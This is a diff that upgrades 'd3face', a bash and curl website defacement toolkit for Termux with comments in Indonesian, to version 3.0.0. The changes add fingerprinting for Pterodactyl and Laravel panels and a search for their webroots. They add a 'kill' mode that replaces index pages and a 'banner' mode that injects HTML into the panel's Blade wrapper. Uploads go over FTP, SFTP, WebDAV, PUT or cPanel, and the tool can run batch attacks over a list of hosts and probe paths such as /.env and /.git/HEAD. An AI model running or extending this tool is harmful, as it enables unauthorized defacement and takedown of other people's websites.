@@ -1,13 +1,14 @@
 #!/usr/bin/env bash
-# d3face 2.0.0 - tool deface website untuk Termux (bash + curl)
-# MIT. Tanpa Python, tanpa dependensi aneh.
+# d3face 3.0.0 - deface toolkit untuk Termux, dengan profil panel (Pterodactyl/Laravel)
+# MIT. bash + curl.
 
-V="2.0.0"
+V="3.0.0"
 CONF="$HOME/.config/d3face/config"
 BKD="$HOME/.config/d3face/backups"
 PGD="$HOME/.config/d3face/pages"
 ERRF="$HOME/.config/d3face/.err"
 IDX="index.html index.htm index.php default.html home.html"
+WRAP="resources/views/templates/wrapper.blade.php"
 
 if [ -t 1 ]; then
   R=$'\e[0m'; B=$'\e[96m'; G=$'\e[92m'; Y=$'\e[93m'; E=$'\e[91m'; D=$'\e[90m'
@@ -16,12 +17,11 @@ else
   R= B= G= Y= E= D= M= W= BD=
 fi
 
-ERRMSG=""; SPIN_PID=""; TMPFILES=()
+ERRMSG=""; UPHTTP=""; SPIN_PID=""; TMPFILES=()
 YES=""; DRY=""; HOST=""; D_USER=""; D_PASS=""; D_METHOD=""; SCHEME=""; D_PORT=0; BATCHF=""
-CLI_TPL=""; CLI_ALIAS=""; CLI_PATH=""
+CLI_TPL=""; CLI_ALIAS=""; CLI_PATH=""; PANEL=""; MODE=""
 CURLOPT=(-sS -k --connect-timeout 12 -m 300 --retry 2 --retry-delay 2 --retry-connrefused)
 
-# ---------- util dasar ----------
 ok()   { printf '%s\n' "${G}[ ✔ ]${R} $*"; }
 bad()  { printf '%s\n' "${E}[ ✘ ]${R} $*"; }
 warn() { printf '%s\n' "${Y}[ ! ]${R} $*"; }
@@ -31,7 +31,6 @@ die()  { printf '%s\n' "${E}[ ✘ ]${R} $*" >&2; exit 2; }
 have() { command -v "$1" >/dev/null 2>&1; }
 
 rep() { local n=$1 c=$2 s=""; while [ "$n" -gt 0 ]; do s+=$c; n=$((n - 1)); done; printf '%s' "$s"; }
-
 pause() { printf '%s' "${D}  ⏎ lanjut...${R}"; read -r _; }
 
 ask() {
@@ -50,9 +49,8 @@ esc() {
   printf '%s' "$s"
 }
 
-tname() { case $1 in 1) printf matrix ;; 2) printf minimal ;; 3) printf glitch ;; 4) printf merah ;; *) printf '?' ;; esac; }
+tname() { case $1 in 1) printf matrix ;; 2) printf minimal ;; 3) printf glitch ;; 4) printf merah ;; 5) printf panel ;; *) printf '?' ;; esac; }
 
-# ---------- spinner ----------
 spin_start() {
   [ -t 1 ] || return 0
   [ -n "$SPIN_PID" ] && return 0
@@ -72,11 +70,7 @@ spin_stop() {
   SPIN_PID=""
   printf '\r\e[K'
 }
-cleanup() {
-  spin_stop
-  local f
-  for f in ${TMPFILES[@]-}; do rm -f "$f" 2>/dev/null; done
-}
+cleanup() { spin_stop; local f; for f in ${TMPFILES[@]-}; do rm -f "$f" 2>/dev/null; done; }
 
 # ---------- jaringan ----------
 req() {
@@ -85,6 +79,17 @@ req() {
   ERRMSG=$(cat "$ERRF" 2>/dev/null)
   printf '%s' "$out"
   return $rc
+}
+
+httpcode() { req -o /dev/null -w '%{http_code}' "$1"; }
+
+urlbase() { # m h p sch
+  local m=$1 h=$2 p=$3 sch=$4 b
+  case $m in
+    ftp|sftp) b="$m://$h"; case $p in 21|22|0|"") ;; *) b="$m://$h:$p" ;; esac ;;
+    *)        b="$sch://$h"; case $p in 80|443|0|"") ;; *) b="$sch://$h:$p" ;; esac ;;
+  esac
+  printf '%s' "$b"
 }
 
 dns() {
@@ -103,29 +108,104 @@ port_open() {
   fi
 }
 
-classify() { # rc http_code -> kode kelas
+classify() {
   local rc=$1 code=$2
   case $rc in
-    0)  case $code in 401|407) return 2 ;; 403) return 3 ;; 404|410) return 4 ;; esac; return 0 ;;
-    6|7|28|35) return 5 ;;
-    9|13|25)   return 3 ;;
-    67)        return 2 ;;
-    78)        return 4 ;;
+    0)
+      case $code in
+        2??)         printf 0 ;;
+        401|407)     printf 2 ;;
+        403|405|501) printf 3 ;;
+        404|410)     printf 4 ;;
+        5??)         printf 6 ;;
+        *)           printf 0 ;;
+      esac
+      return 0 ;;
+    6|7|28|35) printf 5 ;;
+    9|13|25)   printf 3 ;;
+    67)        printf 2 ;;
+    78)        printf 4 ;;
+    *)         printf 6 ;;
   esac
-  return 6
+  return 0
 }
 
 explain() {
   case $1 in
-    2) printf 'login ditolak' ;;
-    3) printf 'akses ditolak / PUT tidak diizinkan' ;;
-    4) printf 'folder tujuan tidak ada' ;;
+    2) printf 'butuh login / kredensial ditolak' ;;
+    3) printf 'akses ditolak' ;;
+    4) printf 'path tidak ada' ;;
     5) printf 'jaringan gagal' ;;
     *) printf 'gagal' ;;
   esac
 }
 
-# ---------- banner & status ----------
+# ---------- fingerprint ----------
+looks_panel() { # url -> 0 kalau berbau panel
+  local b
+  b=$(req "$1")
+  case ${b,,} in
+    *pterodactyl*|*laravel*|*csrf-token*) return 0 ;;
+  esac
+  return 1
+}
+
+detect_panel() { # base -> pterodactyl|laravel|generic
+  local base=$1 hd b
+  hd=$(req -D - -o /dev/null "$base/")
+  case ${hd,,} in
+    *pterodactyl_session*|*x-powered-by:\ pterodactyl*) printf pterodactyl; return ;;
+    *laravel_session*|*x-powered-by:\ laravel*)         printf laravel; return ;;
+  esac
+  b=$(req "$base/api/system")
+  case $b in *'"version"'*|*'"system"'*) printf pterodactyl; return ;; esac
+  b=$(req "$base/")
+  case ${b,,} in
+    *pterodactyl*) printf pterodactyl ;;
+    *)             printf generic ;;
+  esac
+}
+
+wr_parent() { local w=${1%/}; w=${w%/*}; printf '%s' "${w:-/}"; }
+
+find_webroot() { # base profile hint -> path webroot
+  local base=$1 prof=$2 hint=${3-} c
+  if [ -n "$hint" ]; then
+    c=${hint%/}
+    if [ "$(httpcode "$base$c/index.php")" = 200 ] && looks_panel "$base$c/index.php"; then
+      printf '%s' "$c"; return 0
+    fi
+  fi
+  case $prof in
+    pterodactyl|laravel)
+      for c in /public /pterodactyl/public /var/www/pterodactyl/public \
+               /srv/pterodactyl/public /html/public /httpdocs/public ""; do
+        [ -z "$c" ] && c=""
+        if [ "$(httpcode "$base$c/index.php")" = 200 ] && looks_panel "$base$c/index.php"; then
+          printf '%s' "$c"; return 0
+        fi
+      done ;;
+  esac
+  printf '%s' "${hint%/}"
+}
+
+pick_entry() { # base prof -> nama file pintu masuk
+  local base=$1 prof=$2 c
+  if [ "$prof" = pterodactyl ] || [ "$prof" = laravel ]; then
+    [ "$(httpcode "$base/index.php")" = 200 ] && { printf 'index.php'; return; }
+  fi
+  if [ "$(httpcode "$base/index.html")" = 200 ]; then
+    if [ "$(req "$base/" | cksum)" = "$(req "$base/index.html" | cksum)" ]; then
+      printf 'index.html'; return
+    fi
+  fi
+  for c in index.php index.htm default.html home.html; do
+    [ "$(httpcode "$base/$c")" = 200 ] && { printf '%s' "$c"; return; }
+  done
+  printf 'index.html'
+}
+
+# ---------- banner ----------
 banner() {
   printf '%s\n' \
 "${B}██████╗ ██████╗  ███████╗ █████╗  ██████╗███████╗${R}" \
@@ -142,13 +222,14 @@ srow() { printf '%s│%s %-9s %-26s %s│%s\n' "$D" "$R" "$1" "$(printf '%.26s' 
 
 status_box() {
   local bk
-  bk=$(ls -1 "$BKD" 2>/dev/null | wc -l | tr -d ' ')
+  bk=$(ls -1 "$BKD" 2>/dev/null | grep -vc '\.meta$')
   printf '%s╭─ STATUS %s╮%s\n' "$D" "$(rep 29 ─)" "$R"
   srow "alias"    "$ALIAS"
   srow "metode"   "$METHOD"
   srow "template" "$(tname "$TPL")"
+  srow "mode"     "${MODE:-auto}"
   srow "folder"   "$PATH_DIR"
-  srow "backup"   "$bk file"
+  srow "backup"   "${bk:-0} file"
   printf '%s╰%s╯%s\n\n' "$D" "$(rep 38 ─)" "$R"
 }
 
@@ -156,8 +237,8 @@ menu() {
   clear 2>/dev/null
   banner
   status_box
-  printf '   %s1%s  %sCek target%s      port, IP, path sensitif\n' "$BD$B" "$R" "$W" "$R"
-  printf '   %s2%s  %sDeface website%s  upload halaman\n'        "$BD$G" "$R" "$W" "$R"
+  printf '   %s1%s  %sCek target%s      panel, port, path sensitif\n' "$BD$B" "$R" "$W" "$R"
+  printf '   %s2%s  %sDeface website%s  kill atau banner\n'        "$BD$G" "$R" "$W" "$R"
   printf '   %s3%s  %sRestore backup%s  kembalikan asli\n'        "$BD$Y" "$R" "$W" "$R"
   printf '   %s4%s  %sPratinjau%s      lihat template\n'          "$BD$M" "$R" "$W" "$R"
   printf '   %s5%s  %sPengaturan%s      alias, pesan, folder\n\n' "$BD$D" "$R" "$W" "$R"
@@ -172,33 +253,29 @@ save() {
     printf 'PATH_DIR=%q\n' "$PATH_DIR"
     printf 'METHOD=%q\n'   "$METHOD"
     printf 'TPL=%q\n'      "$TPL"
+    printf 'MODE=%q\n'     "${MODE:-auto}"
   } >"$CONF.new" && mv -f "$CONF.new" "$CONF"
 }
 
 defaults() {
-  ALIAS="d3face"
-  MSG="Situs ini telah di-deface. Tidak ada data yang rusak."
-  PATH_DIR="/"
-  METHOD="auto"
-  TPL="1"
+  ALIAS="X-745"
+  MSG="Kemanan Hanyalah Ilusi. Tidak ada Yang Benar-benar Selamanya Di Dunia Ini, Semua Akan Kembali Kepada Sang Pencipta."
+  PATH_DIR="/"; METHOD="auto"; TPL="1"; MODE="auto"
   save
 }
 
 init() {
-  mkdir -p "$(dirname "$CONF")" "$BKD" "$PGD" 2>/dev/null || die "tidak bisa menyiapkan $HOME/.config/d3face"
+  mkdir -p "$(dirname "$CONF")" "$BKD" "$PGD" 2>/dev/null || die "tidak bisa menyiapkan config"
   have curl || die "curl belum ada: pkg install curl"
-  if [ ! -f "$CONF" ]; then
-    defaults
-  elif ! bash -n "$CONF" 2>/dev/null; then
-    warn "config rusak, dikembalikan ke default"
-    defaults
+  if [ ! -f "$CONF" ]; then defaults
+  elif ! bash -n "$CONF" 2>/dev/null; then warn "config rusak, dikembalikan ke default"; defaults
   fi
   # shellcheck disable=SC1090
   . "$CONF"
-  : "${ALIAS:=d3face}" "${MSG:=Situs ini telah di-deface.}" "${PATH_DIR:=/}" "${METHOD:=auto}" "${TPL:=1}"
+  : "${ALIAS:=d3face}" "${MSG:=Situs ini telah di-deface.}" "${PATH_DIR:=/}" "${METHOD:=auto}" "${TPL:=1}" "${MODE:=auto}"
 }
 
-# ---------- template ----------
+# ---------- template halaman ----------
 gen_page() {
   local t=$1 a m h k body
   a=$(esc "$2"); m=$(esc "$3"); h=$(esc "$4"); k=$5
@@ -251,6 +328,29 @@ p{margin:1.4rem auto 0;max-width:560px;line-height:1.65;color:#e0a5a5}
 <h1>__ALIAS__</h1><p>__MSG__</p><div class="m">__HOST__ :: __TS__</div></div><!-- __MARKER__ --></body></html>
 EOF
 );;
+    5) body=$(cat <<'EOF'
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
+<style>html,body{margin:0;height:100%;background:#0b0d12;color:#e2e8f0;font-family:"SFMono-Regular",Consolas,monospace}
+body{display:flex;align-items:center;justify-content:center;background-image:radial-gradient(circle at 50% 0%,#15202b 0%,#0b0d12 60%)}
+.b{width:100%;max-width:640px;margin:1.5rem;border:1px solid #1f2937;border-radius:8px;background:#0f1319;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.6)}
+.bar{display:flex;align-items:center;gap:.45rem;padding:.7rem .9rem;background:#131922;border-bottom:1px solid #1f2937}
+.bar i{width:9px;height:9px;border-radius:50%;background:#2d3748;display:block}
+.bar i:first-child{background:#e53e3e}.bar i:nth-child(2){background:#dd6b20}.bar i:nth-child(3){background:#38a169}
+.bar span{margin-left:auto;font-size:.66rem;color:#4a5568;letter-spacing:.18em}
+.c{padding:2rem 1.6rem}h1{margin:0;font-size:clamp(1.5rem,6vw,2.4rem);color:#63b3ed;letter-spacing:.02em}
+.k{font-size:.66rem;color:#4a5568;letter-spacing:.2em;text-transform:uppercase;margin-bottom:.5rem}
+p{margin:1rem 0 0;line-height:1.7;color:#a0aec0}
+pre{margin:1.6rem 0 0;padding:.9rem;background:#0b0d12;border:1px solid #1f2937;border-radius:6px;font-size:.72rem;color:#68d391;overflow-x:auto}
+.f{margin-top:1.6rem;font-size:.66rem;color:#4a5568;display:flex;gap:1rem;flex-wrap:wrap}
+</style></head><body><div class="b">
+<div class="bar"><i></i><i></i><i></i><span>TAKEN OVER</span></div>
+<div class="c"><div class="k">panel defaced</div><h1>__ALIAS__</h1>
+<p>__MSG__</p><pre>host  : __HOST__
+time  : __TS__
+tool  : d3face</pre>
+<div class="f"><span>__HOST__</span><span>__MARKER__</span></div></div></div><!-- __MARKER__ --></body></html>
+EOF
+);;
     *) gen_page 1 "$2" "$3" "$4" "$5"; return ;;
   esac
   body=${body//__ALIAS__/$a}
@@ -261,19 +361,48 @@ EOF
   printf '%s\n' "$body"
 }
 
-# ---------- cek kredensial ----------
+ptero_snippet() { # alias msg host marker
+  local a m h k s
+  a=$(esc "$1"); m=$(esc "$2"); h=$(esc "$3"); k=$4
+  s=$(cat <<'EOF'
+<!-- __MARKER__ -->
+<style>
+#dfx{position:fixed;left:0;right:0;bottom:0;z-index:2147483647;background:#0f1319;border-top:1px solid #2b6cb0;
+color:#e2e8f0;font:12px/1.5 "SFMono-Regular",Consolas,monospace;padding:10px 44px 10px 14px;
+box-shadow:0 -10px 30px rgba(0,0,0,.6);display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+#dfx b{color:#63b3ed;letter-spacing:.16em;text-transform:uppercase}
+#dfx s{color:#718096;text-decoration:none}
+#dfx .d{width:8px;height:8px;border-radius:50%;background:#48bb78;box-shadow:0 0 10px #48bb78;animation:p 1.6s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
+#dfxx{position:absolute;right:10px;top:8px;background:none;border:1px solid #2d3748;color:#a0aec0;
+border-radius:4px;width:22px;height:22px;cursor:pointer;line-height:1}
+#dfxx:hover{color:#fff;border-color:#4a5568}
+</style>
+<div id="dfx"><span class="d"></span><b>__ALIAS__</b><s>__MSG__</s><s>__HOST__ · __TS__</s>
+<button id="dfxx" onclick="document.getElementById('dfx').remove()">×</button></div>
+<!-- /__MARKER__ -->
+EOF
+)
+  s=${s//__ALIAS__/$a}
+  s=${s//__MSG__/$m}
+  s=${s//__HOST__/$h}
+  s=${s//__TS__/$(date '+%Y-%m-%d %H:%M:%S')}
+  s=${s//__MARKER__/$k}
+  printf '%s' "$s"
+}
+
+# ---------- cek kredensial & unggah ----------
 cek_login() {
   local m=$1 h=$2 p=$3 u=$4 w=$5 path=$6 sch=$7 o
   case $m in
     ftp|sftp)
-      if req -u "$u:$w" "$m://$h/" >/dev/null 2>&1; then ok "$m: login berhasil"; return 0; fi
+      if req -u "$u:$w" "$(urlbase "$m" "$h" "$p" "$sch")/" >/dev/null 2>&1; then
+        ok "$m: login berhasil"; return 0
+      fi
       bad "$m: login ditolak"; return 1 ;;
     webdav|put)
-      o=$(req -X OPTIONS -D - "$sch://$h$path")
-      case ${o^^} in
-        *PUT*) ok "$m: PUT aktif"; return 0 ;;
-        "")    warn "$m: OPTIONS tanpa jawaban"; return 0 ;;
-      esac
+      o=$(req -X OPTIONS -D - "$(urlbase "$m" "$h" "$p" "$sch")$path")
+      case ${o^^} in *PUT*) ok "$m: PUT aktif"; return 0 ;; esac
       bad "$m: PUT tidak diizinkan"; return 1 ;;
     cpanel)
       if req -u "$u:$w" "https://$h:$p/execute/Fileman/list_files?dir=/public_html" | grep -q '"status":1'; then
@@ -284,48 +413,36 @@ cek_login() {
   return 0
 }
 
-detect_index() {
-  local n code
-  for n in $IDX; do
-    code=$(req -I -o /dev/null -w '%{http_code}' "$1/$n")
-    case $code in 200|301|302) printf '%s' "$n"; return 0 ;; esac
-  done
-  printf 'index.html'
-}
-
 upload() { # m h p sch path u w file -> kelas
-  local m=$1 h=$2 p=$3 sch=$4 path=$5 u=$6 w=$7 f=$8 base b code rc body
-  base="$sch://$h"
-  case $p in 80|443|0|"") ;; *) base="$sch://$h:$p" ;; esac
+  local m=$1 h=$2 p=$3 sch=$4 path=$5 u=$6 w=$7 f=$8 code rc body b
+  UPHTTP=""
+  b=$(urlbase "$m" "$h" "$p" "$sch")
   case $m in
     ftp|sftp)
-      b="$m://$h"; case $p in 21|22|0|"") ;; *) b="$m://$h:$p" ;; esac
       curl "${CURLOPT[@]}" --ftp-create-dirs -T "$f" -u "$u:$w" -o /dev/null "$b$path" 2>"$ERRF"; rc=$?
       ERRMSG=$(cat "$ERRF" 2>/dev/null)
       return "$(classify "$rc" "")" ;;
     webdav|put)
       if [ -n "$u" ]; then
-        code=$(curl "${CURLOPT[@]}" -u "$u:$w" -T "$f" -o /dev/null -w '%{http_code}' "$base$path" 2>"$ERRF")
+        code=$(curl "${CURLOPT[@]}" -u "$u:$w" -T "$f" -o /dev/null -w '%{http_code}' "$b$path" 2>"$ERRF")
       else
-        code=$(curl "${CURLOPT[@]}" -T "$f" -o /dev/null -w '%{http_code}' "$base$path" 2>"$ERRF")
+        code=$(curl "${CURLOPT[@]}" -T "$f" -o /dev/null -w '%{http_code}' "$b$path" 2>"$ERRF")
       fi
-      rc=$?; ERRMSG=$(cat "$ERRF" 2>/dev/null)
+      rc=$?; ERRMSG=$(cat "$ERRF" 2>/dev/null); UPHTTP=$code
       return "$(classify "$rc" "$code")" ;;
     cpanel)
       code=$(curl "${CURLOPT[@]}" -u "$u:$w" -F "dir=$(dirname "$path")" \
              -F "file=@$f;filename=$(basename "$path")" -w '\n%{http_code}' \
              "https://$h:$p/execute/Fileman/upload_files" 2>"$ERRF")
       rc=$?; ERRMSG=$(cat "$ERRF" 2>/dev/null)
-      body=${code%$'\n'*}; code=${code##*$'\n'}
-      if [ "$code" = 200 ]; then
-        case $body in *'"status":1'*) return 0 ;; esac
-      fi
+      body=${code%$'\n'*}; code=${code##*$'\n'}; UPHTTP=$code
+      [ "$code" = 200 ] && case $body in *'"status":1'*) return 0 ;; esac
       return "$(classify "$rc" "$code")" ;;
   esac
   return 6
 }
 
-verify() {
+verify() { # base path marker alias
   local out
   out=$(req "$1$2?v=$RANDOM$RANDOM")
   case $out in *"$3"*) return 0 ;; esac
@@ -333,13 +450,21 @@ verify() {
   return 1
 }
 
+backup_file() { # m h p sch path -> cetak nama backup
+  local b
+  b="$BKD/$(date +%s)_$(printf '%s' "$5" | tr '/' '_' | sed 's/^_*//')"
+  if req -u "$6:$7" "$(urlbase "$1" "$2" "$3" "$4")$5" >"$b" && [ -s "$b" ]; then
+    { printf 'path=%s\n' "$5"; printf 'method=%s\n' "$1"; } >"$b.meta"
+    printf '%s' "$b"; return 0
+  fi
+  rm -f "$b"; return 1
+}
+
 # ---------- aksi utama ----------
 do_deface() {
-  local host=$1 sch meth u w port dir tpl alias msg marker base path lf b m rc
-  sch=${SCHEME:-https}
-  meth=${D_METHOD:-auto}
-  u=${D_USER:-}; w=${D_PASS:-}
-  port=${D_PORT:-0}
+  local host=$1 sch meth u w port dir tpl alias msg marker base path webroot prof mode entry
+  local lf b m rc snip blade new rpath
+  sch=${SCHEME:-https}; meth=${D_METHOD:-auto}; u=${D_USER:-}; w=${D_PASS:-}; port=${D_PORT:-0}
   dir=$PATH_DIR; tpl=$TPL; alias=$ALIAS; msg=$MSG
 
   if [ -z "$YES" ]; then
@@ -352,10 +477,8 @@ do_deface() {
   if [ -z "$YES" ]; then
     sch=$(ask "skema (http/https)" "$sch")
     meth=$(ask "metode (auto/ftp/sftp/webdav/put/cpanel)" "$meth")
-    [ -z "$u" ] && case $meth in ftp|sftp|webdav|cpanel) u=$(ask "username") ;; esac
-    [ -z "$u" ] && [ -n "$meth" ] && case $meth in ftp|sftp|webdav|cpanel) return 1 ;; esac
+    case $meth in ftp|sftp|webdav|cpanel) [ -z "$u" ] && u=$(ask "username") ;; esac
   fi
-
   case $sch in http|https) ;; *) sch="https" ;; esac
   case $meth in auto|ftp|sftp|webdav|put|cpanel) ;; *) bad "metode tidak dikenal: $meth"; return 1 ;; esac
 
@@ -366,21 +489,18 @@ do_deface() {
       [ -n "$w" ] || { bad "password wajib untuk $meth"; return 1; } ;;
   esac
 
-  if [ "$port" = 0 ]; then
-    case $meth in ftp) port=21 ;; sftp) port=22 ;; cpanel) port=2083 ;; *) port=0 ;; esac
-  fi
-  if [ "$port" = 0 ]; then
-    case $sch in https) port=443 ;; *) port=80 ;; esac
-  fi
+  [ "$port" = 0 ] && case $meth in ftp) port=21 ;; sftp) port=22 ;; cpanel) port=2083 ;; esac
+  [ "$port" = 0 ] && case $sch in https) port=443 ;; *) port=80 ;; esac
 
   if [ -z "$YES" ]; then
     dir=$(ask "folder tujuan" "$dir")
-    printf '\n  %s1%s matrix   %s2%s minimal   %s3%s glitch   %s4%s merah\n' "$B" "$R" "$G" "$R" "$M" "$R" "$E" "$R"
+    printf '\n  %s1%s matrix  %s2%s minimal  %s3%s glitch  %s4%s merah  %s5%s panel\n' \
+      "$B" "$R" "$G" "$R" "$M" "$R" "$E" "$R" "$W" "$R"
     tpl=$(ask "template" "$tpl")
     alias=$(ask "alias" "$alias")
     msg=$(ask "pesan" "$msg")
   fi
-  case $tpl in 1|2|3|4) ;; *) tpl=1 ;; esac
+  case $tpl in 1|2|3|4|5) ;; *) tpl=1 ;; esac
 
   clear 2>/dev/null
   banner
@@ -394,50 +514,106 @@ do_deface() {
     }
   fi
 
-  base="$sch://$host"
-  case $port in 80|443) ;; *) base="$sch://$host:$port" ;; esac
-  path="${dir%/}/$(detect_index "$base")"
+  base="$sch://$host"; case $port in 80|443) ;; *) base="$sch://$host:$port" ;; esac
+
+  prof=$PANEL
+  if [ -z "$prof" ] || [ "$prof" = auto ]; then
+    spin_start "fingerprint"
+    prof=$(detect_panel "$base")
+    spin_stop
+  fi
+  case $prof in pterodactyl|laravel) info "panel terdeteksi: $prof" ;; esac
+
+  webroot=$(find_webroot "$base" "$prof" "$dir")
+  [ -z "$webroot" ] && webroot="${dir%/}"
+  entry=$(pick_entry "$base$webroot" "$prof")
+  path="${webroot%/}/$entry"
+  [ "$entry" = index.php ] && [ "$tpl" != 5 ] && case $prof in pterodactyl) tpl=5 ;; esac
   ok "target: $base$path"
 
+  mode=$MODE
+  [ -z "$mode" ] && mode="auto"
+  rpath=""
+  if [ "$mode" = auto ]; then
+    case $prof in
+      pterodactyl) mode=banner ;;
+      *)           mode=kill ;;
+    esac
+  fi
+  if [ "$mode" = banner ]; then
+    rpath="/$(wr_parent "$webroot")/$WRAP"
+    rpath=$(printf '%s' "$rpath" | sed 's#//*#/#g')
+    if [ "$prof" != pterodactyl ] && [ "$prof" != laravel ]; then
+      warn "bukan panel Laravel — banner dialihkan ke kill"; mode=kill; rpath=""
+    fi
+  fi
+  info "mode: $mode${rpath:+ ($rpath)}"
+
   marker="d3face-$RANDOM$RANDOM$RANDOM"
-  lf="$PGD/${host}_$(basename "$path")"
-  gen_page "$tpl" "$alias" "$msg" "$host" "$marker" >"$lf" || { bad "gagal menulis $lf"; return 1; }
+  lf="$PGD/$(date +%s)_$(printf '%s' "$host$path" | tr '/' '_')"
+  TMPFILES+=("$lf")
+
+  if [ "$mode" = kill ]; then
+    gen_page "$tpl" "$alias" "$msg" "$host" "$marker" >"$lf" || { bad "gagal menulis $lf"; return 1; }
+    snip=""
+  else
+    snip=$(ptero_snippet "$alias" "$msg" "$host" "$marker")
+  fi
 
   echo; hr
-  printf '  %shost%s   : %s\n  %sfile%s   : %s\n  %smetode%s : %s\n  %stemplate%s: %s\n' \
-    "$D" "$R" "$host" "$D" "$R" "$path" "$D" "$R" "$meth" "$D" "$R" "$(tname "$tpl")"
+  printf '  %shost%s  : %s\n  %spath%s  : %s\n  %smode%s  : %s\n  %stpl%s   : %s\n' \
+    "$D" "$R" "$host" "$D" "$R" "$path" "$D" "$R" "$mode" "$D" "$R" "$(tname "$tpl")"
+  case $mode in kill) warn "panel akan offline sampai di-restore" ;; esac
   hr
 
-  if [ -n "$DRY" ]; then
-    ok "dry-run: tidak ada upload"
-    info "halaman tersimpan: $lf"
-    return 0
-  fi
+  if [ -n "$DRY" ]; then ok "dry-run: tidak ada upload"; info "payload: $lf"; return 0; fi
+  [ -z "$YES" ] && ! askyn "mulai?" && return 1
 
-  [ -z "$YES" ] && ! askyn "mulai deface?" && return 1
-
-  b="$BKD/${host}_$(date +%s)_$(basename "$path")"
-  spin_start "backup halaman lama"
-  if req -o "$b" "$base$path" && [ -s "$b" ]; then
-    spin_stop; ok "backup: $(basename "$b")"
-  else
-    spin_stop; rm -f "$b"; b=""; warn "backup dilewati"
-  fi
+  spin_start "backup"
+  b=$(backup_file "$meth" "$host" "$port" "$sch" "$path" "$u" "$w") || b=""
+  spin_stop
+  if [ -n "$b" ]; then ok "backup: $(basename "$b")"; else warn "backup dilewati"; fi
 
   case $meth in auto) set -- ftp sftp webdav put ;; *) set -- "$meth" ;; esac
   for m in "$@"; do
     case $m in ftp|sftp|webdav|cpanel) [ -z "$u" ] && continue ;; esac
+
+    if [ "$mode" = banner ]; then
+      spin_start "ambil wrapper via $m"
+      blade=$(req -u "$u:$w" "$(urlbase "$m" "$host" "$port" "$sch")$rpath")
+      spin_stop
+      if [ -z "$blade" ]; then bad "$m: $rpath tidak terbaca"; continue; fi
+      case $blade in
+        *'</body>'*) new=${blade//<\/body>/$snip<\/body>} ;;
+        *)           new="$blade$snip" ;;
+      esac
+      printf '%s' "$new" >"$lf"
+    fi
+
     spin_start "upload via $m"
     upload "$m" "$host" "$port" "$sch" "$path" "$u" "$w" "$lf"; rc=$?
     spin_stop
     if [ "$rc" != 0 ]; then
-      bad "$m: $(explain "$rc")${ERRMSG:+ — ${ERRMSG%%$'\n'*}}"
+      bad "$m: $(explain "$rc")${UPHTTP:+ [HTTP $UPHTTP]}"
+      [ -n "$ERRMSG" ] && printf '%s\n' "${D}        ${ERRMSG%%$'\n'*}${R}"
+      case $UPHTTP in 405|501) printf '%s\n' "${D}        server menolak PUT${R}" ;; esac
       continue
     fi
     ok "$m: upload terkirim"
+
+    if [ "$mode" = banner ]; then
+      if verify "$base" "/" "$marker" "$alias"; then
+        echo; printf '%s\n' "${G}╭─ BANNER AKTIF ───────────────────────────────╮${R}"
+        printf '%s\n' "${G}│${R} panel masih hidup, bilah tampil di bawah"
+        printf '%s\n' "${G}╰──────────────────────────────────────────────╯${R}"
+        return 0
+      fi
+      bad "$m: terkirim tapi bilah belum tampak"
+      continue
+    fi
+
     if verify "$base" "$path" "$marker" "$alias"; then
-      echo
-      printf '%s\n' "${G}╭─ BERHASIL ───────────────────────────────────╮${R}"
+      echo; printf '%s\n' "${G}╭─ BERHASIL ───────────────────────────────────╮${R}"
       printf '%s\n' "${G}│${R} $base$path"
       printf '%s\n' "${G}╰──────────────────────────────────────────────╯${R}"
       return 0
@@ -445,9 +621,8 @@ do_deface() {
     bad "$m: terkirim tapi halaman belum berubah"
   done
 
-  echo
-  printf '%s\n' "${E}  gagal di semua metode${R}"
-  [ -n "$b" ] && warn "backup tersimpan — pulihkan lewat menu 3"
+  echo; printf '%s\n' "${E}  gagal di semua metode${R}"
+  [ -n "$b" ] && warn "backup ada — pulihkan lewat menu 3"
   return 1
 }
 
@@ -455,28 +630,24 @@ batch() {
   local f=$1 h n=0 s=0
   [ -f "$f" ] || { bad "file tidak ada: $f"; return 1; }
   while IFS= read -r h; do
-    h=${h%%#*}
-    h=$(printf '%s' "$h" | tr -d ' \t\r')
+    h=${h%%#*}; h=$(printf '%s' "$h" | tr -d ' \t\r')
     [ -z "$h" ] && continue
-    n=$((n + 1))
-    printf '\n%s\n' "${B}═══ [$n] $h ═══${R}"
+    n=$((n + 1)); printf '\n%s\n' "${B}═══ [$n] $h ═══${R}"
     do_deface "$h" && s=$((s + 1))
   done <"$f"
-  printf '\n%s\n' "${G}selesai: $s/$n berhasil${R}"
+  printf '\n%s\n' "${G}selesai: $s/$n${R}"
 }
 
 recon() {
   clear 2>/dev/null
   banner
   printf '%s\n\n' "${B}  RECON${R}"
-  local h p path code ip
+  local h p path code ip base prof
   h=$(ask "domain"); [ -z "$h" ] && return
   h=${h#http://}; h=${h#https://}; h=${h%%/*}; h=${h%/}
   [ -z "$h" ] && { bad "domain kosong"; return; }
 
-  spin_start "resolve $h"
-  ip=$(dns "$h")
-  spin_stop
+  spin_start "resolve $h"; ip=$(dns "$h"); spin_stop
   [ -z "$ip" ] && { bad "tidak bisa di-resolve"; return; }
   ok "IP: $ip"
 
@@ -486,9 +657,18 @@ recon() {
     else spin_stop; printf '%s\n' "${D}  · port $p tertutup${R}"; fi
   done
 
+  base="https://$h"
+  spin_start "fingerprint"; prof=$(detect_panel "$base"); spin_stop
+  case $prof in
+    pterodactyl) printf '%s\n' "${M}  ▲ Pterodactyl terdeteksi${R}"
+                 printf '%s\n' "${D}    webroot: $(find_webroot "$base" "$prof")${R}" ;;
+    laravel)     printf '%s\n' "${M}  ▲ Laravel terdeteksi${R}" ;;
+    *)           printf '%s\n' "${D}  · situs generik${R}" ;;
+  esac
+
   echo
-  for path in /wp-login.php /administrator/ /phpmyadmin/ /.git/HEAD /.env /server-status; do
-    code=$(req -o /dev/null -w '%{http_code}' "https://$h$path")
+  for path in /api/system /wp-login.php /administrator/ /phpmyadmin/ /.git/HEAD /.env /server-status; do
+    code=$(httpcode "$base$path")
     case $code in 200|401|403|301|302) printf '%s\n' "${Y}  ▲ $code  $path${R}" ;; esac
   done
   echo; hr
@@ -499,49 +679,49 @@ restore() {
   banner
   printf '%s\n\n' "${Y}  RESTORE${R}"
   local list n f host u w m port sch path rc
-  list=$(ls -1t "$BKD" 2>/dev/null | head -20)
